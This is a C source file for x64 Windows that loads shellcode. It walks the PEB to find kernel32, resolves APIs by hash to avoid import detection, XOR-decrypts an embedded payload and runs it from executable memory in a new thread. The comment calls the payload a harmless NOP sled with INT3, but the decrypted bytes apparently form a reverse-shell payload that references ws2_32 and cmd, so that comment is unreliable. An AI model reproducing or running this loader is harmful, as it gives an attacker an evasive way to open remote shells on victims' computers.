#include <windows.h>
#include <winternl.h>
#include <stdio.h>

// ------------------------------------------------------------
// 64-bit specific PEB access
// ------------------------------------------------------------
#ifdef _WIN64
#define GetPeb() (PPEB) __readgsqword(0x60)
#else
#error "This code is intended for x64 only."
#endif

// ------------------------------------------------------------
// Simple FNV-1a hash for API names
// ------------------------------------------------------------
DWORD HashStringA(LPCSTR String)
{
    DWORD Hash = 0x811C9DC5;
    while (*String)
    {
        Hash ^= *String++;
        Hash *= 0x01000193;
    }
    return Hash;
}

// ------------------------------------------------------------
// Structure to hold resolved function pointers
// ------------------------------------------------------------
typedef struct _API_SET
{
    ULONG_PTR pVirtualAlloc;
    ULONG_PTR pCreateThread;
    ULONG_PTR pWaitForSingleObject;
} API_SET, *PAPI_SET;

// Function pointer types
typedef LPVOID(WINAPI *fnVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef HANDLE(WINAPI *fnCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef DWORD(WINAPI *fnWaitForSingleObject)(HANDLE, DWORD);

// ------------------------------------------------------------
// Parse export directory of a module to find function by hash
// ------------------------------------------------------------
ULONG_PTR GetProcAddressByHash(ULONG_PTR ModuleBase, DWORD FunctionHash)
{
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)ModuleBase;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE)
        return 0;

    PIMAGE_NT_HEADERS64 pNt = (PIMAGE_NT_HEADERS64)(ModuleBase + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE)
        return 0;

    IMAGE_DATA_DIRECTORY ExportDir = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (ExportDir.VirtualAddress == 0)
        return 0;

    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(ModuleBase + ExportDir.VirtualAddress);
    PDWORD AddressOfNames = (PDWORD)(ModuleBase + pExport->AddressOfNames);
    PDWORD AddressOfFunctions = (PDWORD)(ModuleBase + pExport->AddressOfFunctions);
    PWORD AddressOfNameOrdinals = (PWORD)(ModuleBase + pExport->AddressOfNameOrdinals);

    for (DWORD i = 0; i < pExport->NumberOfNames; i++)
    {
        LPCSTR Name = (LPCSTR)(ModuleBase + AddressOfNames[i]);
        if (HashStringA(Name) == FunctionHash)
        {
            WORD Ordinal = AddressOfNameOrdinals[i];
            return (ModuleBase + AddressOfFunctions[Ordinal]);
        }
    }
    return 0;
}

// ------------------------------------------------------------
// Locate kernel32.dll base address via PEB walking (x64)
// ------------------------------------------------------------
ULONG_PTR FindKernel32()
{
    PPEB Peb = GetPeb();
    if (!Peb || !Peb->Ldr)
        return 0;

    // Get first module in initialization order list
    PLIST_ENTRY ModuleList = &Peb->Ldr->InMemoryOrderModuleList;
    PLIST_ENTRY CurrentEntry = ModuleList->Flink;

    // Skip current executable (first entry)
    CurrentEntry = CurrentEntry->Flink;

    // Second entry is ntdll.dll, third is kernel32.dll
    CurrentEntry = CurrentEntry->Flink;

    PLDR_DATA_TABLE_ENTRY ModuleEntry = CONTAINING_RECORD(CurrentEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
    return (ULONG_PTR)ModuleEntry->DllBase;
}

// ------------------------------------------------------------
// Resolve required APIs from kernel32.dll
// ------------------------------------------------------------
BOOL ResolveAPIs(PAPI_SET pApis)
{
    ULONG_PTR Kernel32Base = FindKernel32();
    if (!Kernel32Base)
        return FALSE;

    pApis->pVirtualAlloc = GetProcAddressByHash(Kernel32Base, HashStringA("VirtualAlloc"));
    pApis->pCreateThread = GetProcAddressByHash(Kernel32Base, HashStringA("CreateThread"));
    pApis->pWaitForSingleObject = GetProcAddressByHash(Kernel32Base, HashStringA("WaitForSingleObject"));

    return (pApis->pVirtualAlloc && pApis->pCreateThread && pApis->pWaitForSingleObject);
}

// ------------------------------------------------------------
// Simple XOR decryption routine (customize as needed)
// ------------------------------------------------------------
VOID XorDecrypt(PBYTE Buffer, SIZE_T Size, BYTE Key)
{
    for (SIZE_T i = 0; i < Size; i++)
    {
        Buffer[i] ^= Key;
    }
}

// ------------------------------------------------------------
// Main execution
// ------------------------------------------------------------
int main()
{
    // --------------------------------------------------------
    // Replace this with your own 64-bit shellcode (position-independent)
    // Example: a simple NOP sled + INT3 (for testing)
    // --------------------------------------------------------
    BYTE EncryptedShellcode[] = {
    0x56, 0xe2, 0x29, 0x4e, 0x5a, 0x42, 0x6a, 0xaa, 0xaa, 0xaa, 0xeb, 0xfb,
    0xeb, 0xfa, 0xf8, 0xfb, 0xfc, 0xe2, 0x9b, 0x78, 0xcf, 0xe2, 0x21, 0xf8,
    0xca, 0xe2, 0x21, 0xf8, 0xb2, 0xe2, 0x21, 0xf8, 0x8a, 0xe2, 0x21, 0xd8,
    0xfa, 0xe2, 0xa5, 0x1d, 0xe0, 0xe0, 0xe7, 0x9b, 0x63, 0xe2, 0x9b, 0x6a,
    0x06, 0x96, 0xcb, 0xd6, 0xa8, 0x86, 0x8a, 0xeb, 0x6b, 0x63, 0xa7, 0xeb,
    0xab, 0x6b, 0x48, 0x47, 0xf8, 0xeb, 0xfb, 0xe2, 0x21, 0xf8, 0x8a, 0x21,
    0xe8, 0x96, 0xe2, 0xab, 0x7a, 0x21, 0x2a, 0x22, 0xaa, 0xaa, 0xaa, 0xe2,
    0x2f, 0x6a, 0xde, 0xcd, 0xe2, 0xab, 0x7a, 0xfa, 0x21, 0xe2, 0xb2, 0xee,
    0x21, 0xea, 0x8a, 0xe3, 0xab, 0x7a, 0x49, 0xfc, 0xe2, 0x55, 0x63, 0xeb,
    0x21, 0x9e, 0x22, 0xe2, 0xab, 0x7c, 0xe7, 0x9b, 0x63, 0xe2, 0x9b, 0x6a,
    0x06, 0xeb, 0x6b, 0x63, 0xa7, 0xeb, 0xab, 0x6b, 0x92, 0x4a, 0xdf, 0x5b,
    0xe6, 0xa9, 0xe6, 0x8e, 0xa2, 0xef, 0x93, 0x7b, 0xdf, 0x72, 0xf2, 0xee,
    0x21, 0xea, 0x8e, 0xe3, 0xab, 0x7a, 0xcc, 0xeb, 0x21, 0xa6, 0xe2, 0xee,
    0x21, 0xea, 0xb6, 0xe3, 0xab, 0x7a, 0xeb, 0x21, 0xae, 0x22, 0xe2, 0xab,
    0x7a, 0xeb, 0xf2, 0xeb, 0xf2, 0xf4, 0xf3, 0xf0, 0xeb, 0xf2, 0xeb, 0xf3,
    0xeb, 0xf0, 0xe2, 0x29, 0x46, 0x8a, 0xeb, 0xf8, 0x55, 0x4a, 0xf2, 0xeb,
    0xf3, 0xf0, 0xe2, 0x21, 0xb8, 0x43, 0xfd, 0x55, 0x55, 0x55, 0xf7, 0xe3,
    0x14, 0xdd, 0xd9, 0x98, 0xf5, 0x99, 0x98, 0xaa, 0xaa, 0xeb, 0xfc, 0xe3,
    0x23, 0x4c, 0xe2, 0x2b, 0x46, 0x0a, 0xab, 0xaa, 0xaa, 0xe3, 0x23, 0x4f,
    0xe3, 0x16, 0xa8, 0xaa, 0xa2, 0x04, 0xa0, 0xaa, 0xa8, 0xa2, 0xeb, 0xfe,
    0xe3, 0x23, 0x4e, 0xe6, 0x23, 0x5b, 0xeb, 0x10, 0xe6, 0xdd, 0x8c, 0xad,
    0x55, 0x7f, 0xe6, 0x23, 0x40, 0xc2, 0xab, 0xab, 0xaa, 0xaa, 0xf3, 0xeb,
    0x10, 0x83, 0x2a, 0xc1, 0xaa, 0x55, 0x7f, 0xfa, 0xfa, 0xe7, 0x9b, 0x63,
    0xe7, 0x9b, 0x6a, 0xe2, 0x55, 0x6a, 0xe2, 0x23, 0x68, 0xe2, 0x55, 0x6a,
    0xe2, 0x23, 0x6b, 0xeb, 0x10, 0x40, 0xa5, 0x75, 0x4a, 0x55, 0x7f, 0xe2,
    0x23, 0x6d, 0xc0, 0xba, 0xeb, 0xf2, 0xe6, 0x23, 0x48, 0xe2, 0x23, 0x53,
    0xeb, 0x10, 0x33, 0x0f, 0xde, 0xcb, 0x55, 0x7f, 0xe2, 0x2b, 0x6e, 0xea,
    0xa8, 0xaa, 0xaa, 0xe3, 0x12, 0xc9, 0xc7, 0xce, 0xaa, 0xaa, 0xaa, 0xaa,
    0xaa, 0xeb, 0xfa, 0xeb, 0xfa, 0xe2, 0x23, 0x48, 0xfd, 0xfd, 0xfd, 0xe7,
    0x9b, 0x6a, 0xc0, 0xa7, 0xf3, 0xeb, 0xfa, 0x48, 0x56, 0xcc, 0x6d, 0xee,
    0x8e, 0xfe, 0xab, 0xab, 0xe2, 0x27, 0xee, 0x8e, 0xb2, 0x6c, 0xaa, 0xc2,
    0xe2, 0x23, 0x4c, 0xfc, 0xfa, 0xeb, 0xfa, 0xeb, 0xfa, 0xeb, 0xfa, 0xe3,
    0x55, 0x6a, 0xeb, 0xfa, 0xe3, 0x55, 0x62, 0xe7, 0x23, 0x6b, 0xe6, 0x23,
    0x6b, 0xeb, 0x10, 0xd3, 0x66, 0x95, 0x2c, 0x55, 0x7f, 0xe2, 0x9b, 0x78,
    0xe2, 0x55, 0x60, 0x21, 0xa4, 0xeb, 0x10, 0xa2, 0x2d, 0xb7, 0xca, 0x55,
    0x7f, 0x11, 0x5a, 0x1f, 0x08, 0xfc, 0xeb, 0x10, 0x0c, 0x3f, 0x17, 0x37,
    0x55, 0x7f, 0xe2, 0x29, 0x6e, 0x82, 0x96, 0xac, 0xd6, 0xa0, 0x2a, 0x51,
    0x4a, 0xdf, 0xaf, 0x11, 0xed, 0xb9, 0xd8, 0xc5, 0xc0, 0xaa, 0xf3, 0xeb,
    0x23, 0x70, 0x55, 0x7f
};
    SIZE_T ShellcodeSize = sizeof(EncryptedShellcode);
    BYTE XorKey = 0xAA;

    // Decrypt shellcode (if encrypted)
    XorDecrypt(EncryptedShellcode, ShellcodeSize, XorKey);

    // Resolve APIs dynamically
    API_SET Apis = {0};
    if (!ResolveAPIs(&Apis))
    {
        printf("[-] Failed to resolve APIs.\n");
        return -1;
    }

	printf("[+] APIs resolved successfully\n");

    // Cast to proper function types
    fnVirtualAlloc MyVirtualAlloc = (fnVirtualAlloc)Apis.pVirtualAlloc;
    fnCreateThread MyCreateThread = (fnCreateThread)Apis.pCreateThread;
    fnWaitForSingleObject MyWaitForSingleObject = (fnWaitForSingleObject)Apis.pWaitForSingleObject;

    // Allocate executable memory
	printf("[+] Allocating memory...\n");
    LPVOID pExecMem = MyVirtualAlloc(NULL, ShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pExecMem)
    {
        printf("[-] VirtualAlloc failed.\n");
        return -1;
    }

	printf("[+] Memory allocated at %p\n", pExecMem);

	printf("[+] Copying shellcode...\n");

    // Copy shellcode to allocated memory
    memcpy(pExecMem, EncryptedShellcode, ShellcodeSize);

	printf("[+] Shellcode copied\n");

	printf("[+] Creating thread...\n");

    // Create a thread to execute the shellcode
    HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pExecMem, NULL, 0, NULL);
    if (!hThread)
    {
        printf("[-] CreateThread failed.\n");
        return -1;
    }
	printf("[+] Thread created, waiting...\n");
    // Wait for the thread to finish
    MyWaitForSingleObject(hThread, INFINITE);
	printf("[+] Thread finished\n");

    return 0;
}
